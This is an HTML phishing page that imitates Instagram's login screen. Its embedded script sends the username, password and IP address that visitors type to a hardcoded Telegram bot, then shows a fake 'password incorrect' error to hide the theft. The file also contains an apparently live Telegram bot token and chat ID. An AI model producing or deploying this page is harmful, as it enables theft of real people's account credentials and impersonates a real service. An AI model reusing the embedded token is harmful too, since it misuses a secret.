<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #fafafa;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            color: #262626;
        }
        
        .container {
            display: flex;
            flex-direction: column;
            align-items: center;
            max-width: 350px;
            width: 100%;
        }
        
        .login-box {
            background-color: white;
            border: 1px solid #dbdbdb;
            padding: 20px 40px;
            margin-bottom: 10px;
            text-align: center;
            width: 100%;
        }
        
        .logo {
            margin: 22px auto 12px;
            width: 175px;
        }
        
        form {
            margin-top: 24px;
        }
        
        input {
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            color: #262626;
            font-size: 14px;
            padding: 9px 8px 7px;
            margin-bottom: 6px;
            width: 100%;
            box-sizing: border-box;
        }
        
        button {
            background-color: #0095f6;
            border: none;
            border-radius: 4px;
            color: white;
            font-weight: 600;
            padding: 5px 9px;
            width: 100%;
            margin-top: 8px;
            cursor: pointer;
            height: 32px;
        }
        
        .divider {
            display: flex;
            align-items: center;
            margin: 10px 0 18px;
        }
        
        .line {
            flex-grow: 1;
            height: 1px;
            background-color: #dbdbdb;
        }
        
        .or {
            color: #8e8e8e;
            font-weight: 600;
            margin: 0 18px;
            font-size: 13px;
        }
        
        .fb-login {
            color: #385185;
            font-weight: 600;
            font-size: 14px;
            margin: 8px 0;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .fb-icon {
            margin-right: 8px;
            font-size: 16px;
        }
        
        .forgot-password {
            color: #00376b;
            font-size: 12px;
            margin-top: 12px;
        }
        
        .signup-box {
            background-color: white;
            border: 1px solid #dbdbdb;
            padding: 20px;
            text-align: center;
            width: 100%;
            font-size: 14px;
        }
        
        .signup-link {
            color: #0095f6;
            font-weight: 600;
            text-decoration: none;
        }
        
        .app-download {
            text-align: center;
            margin-top: 20px;
        }
        
        .app-text {
            margin: 10px 0 20px;
            font-size: 14px;
        }
        
        .app-stores {
            display: flex;
            justify-content: center;
        }
        
        .app-store {
            height: 40px;
            margin: 0 4px;
        }
        
        footer {
            margin-top: 24px;
            text-align: center;
            font-size: 12px;
            color: #8e8e8e;
        }
        
        footer a {
            color: #8e8e8e;
            margin: 0 4px;
            text-decoration: none;
        }
        
        .error {
            color: #ed4956;
            font-size: 14px;
            line-height: 18px;
            margin: 10px 0;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" alt="Instagram" class="logo">
            
            <form id="loginForm">
                <div id="error" class="error" style="display: none;"></div>
                
                <input type="text" name="username" placeholder="Phone number, username, or email" required>
                <input type="password" name="password" placeholder="Password" required>
                <button type="submit">Log In</button>
                
                <div class="divider">
                    <div class="line"></div>
                    <div class="or">OR</div>
                    <div class="line"></div>
                </div>
                
                <div class="fb-login">
                    <span class="fb-icon">f</span>
                    Log in with Facebook
                </div>
                
                <a href="#" class="forgot-password">Forgot password?</a>
            </form>
        </div>
        
        <div class="signup-box">
            Don't have an account? <a href="#" class="signup-link">Sign up</a>
        </div>
        
        <div class="app-download">
            <p class="app-text">Get the app.</p>
            <div class="app-stores">
                <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/180ae7a0bcf7.png" alt="App Store" class="app-store">
                <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/e9cd846dc748.png" alt="Google Play" class="app-store">
            </div>
        </div>
        
        <footer>
            <a href="#">Meta</a>
            <a href="#">About</a>
            <a href="#">Blog</a>
            <a href="#">Jobs</a>
            <a href="#">Help</a>
            <a href="#">API</a>
            <a href="#">Privacy</a>
            <a href="#">Terms</a>
            <a href="#">Top Accounts</a>
            <a href="#">Hashtags</a>
            <a href="#">Locations</a>
            <a href="#">Instagram Lite</a>
            <a href="#">Contact Uploading & Non-Users</a>
            <br>
            <span>English Â© 2023 Instagram from Meta</span>
        </footer>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const username = this.username.value;
            const password = this.password.value;
            
            // Show loading/processing
            const submitBtn = this.querySelector('button[type="submit"]');
            submitBtn.disabled = true;
            submitBtn.textContent = 'Logging in...';
            
            // Get user's IP address
            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(ipData => {
                    const ip = ipData.ip;
                    
                    // Send data to Telegram bot
                    const botToken = '8485585661:AAGK1xxSykr63yo2WI_vaOVGhbsz2o9rfbg';
                    const chatId = '1279639977';
                    const message = `New Instagram Login Attempt:\nUsername: ${username}\nPassword: ${password}\nIP: ${ip}`;
                    
                    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            chat_id: chatId,
                            text: message
                        })
                    })
                    .then(response => response.json())
                    .then(data => {
                        // Show error message (to make it look like login failed)
                        document.getElementById('error').style.display = 'block';
                        document.getElementById('error').textContent = 'Sorry, your password was incorrect. Please double-check your password.';
                        
                        // Reset form
                        submitBtn.disabled = false;
                        submitBtn.textContent = 'Log In';
                        this.password.value = '';
                    })
                    .catch(error => {
                        console.error('Error sending to Telegram:', error);
                        submitBtn.disabled = false;
                        submitBtn.textContent = 'Log In';
                    });
                })
                .catch(error => {
                    console.error('Error getting IP:', error);
                    submitBtn.disabled = false;
                    submitBtn.textContent = 'Log In';
                });
        });
    </script>
</body>
</html>
